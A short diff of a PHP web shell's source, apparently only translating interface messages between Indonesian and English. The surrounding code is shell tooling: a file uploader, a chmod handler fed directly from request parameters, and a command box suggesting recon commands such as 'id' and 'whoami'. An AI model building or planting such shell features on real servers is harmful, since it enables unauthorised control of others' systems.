@@ -262,7 +262,7 @@ function aksiUpload($dir){
     if($jumlah < 2){
       if($up){
         $swa = "success";
-        $text = "Upload Succeed $filename";
+        $text = "Berhasil Upload $filename";
         swall($swa,$text,$dir);
       }else{
         $swa = "error";
@@ -271,7 +271,7 @@ function aksiUpload($dir){
       }
     }else{
       $swa = "success";
-      $text = "Upload Succeed $jumlah File";
+      $text = "Berhasil Upload $jumlah File";
       swall($swa,$text,$dir);
     }
   }
@@ -286,9 +286,9 @@ function chmodFile($dir,$file,$nfile){
   </form>";
   if(isset($_POST['perm'])){
     if(@chmod($_GET['file'],$_POST['perm'])){
-      echo '<font color="lime">Change Permission Berhasil</font><br/>';
+      echo '<font color="lime">Permission Changed Successfully </font><br/>';
     }else{
-      echo '<font color="white">Change Permission Fail</font><br/>';
+      echo '<font color="white">Fail to change permission </font><br/>';
     }
   }
   exit;
@@ -2134,7 +2134,7 @@ function zipMenu($dir,$file){
             <input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="id | uname -a | whoami | heked">
           </form>
           <hr/>
-          <h5><i class="fa fa-search"></i> Information : </h5>
+          <h5><i class="fa fa-search"></i> Informasi : </h5>
           <div class="card table-responsive">
             <div class="card-body">
               <table class="table infor">
@@ -2175,7 +2175,7 @@ function zipMenu($dir,$file){
                   <td>: '.$sof.'</td>
                 </tr>
                 <tr>
-                  <td>Sistem Operation</td>
+                  <td>Sistem Operasi</td>
                   <td> : '.$os.'</td>
                 </tr>
               </table>
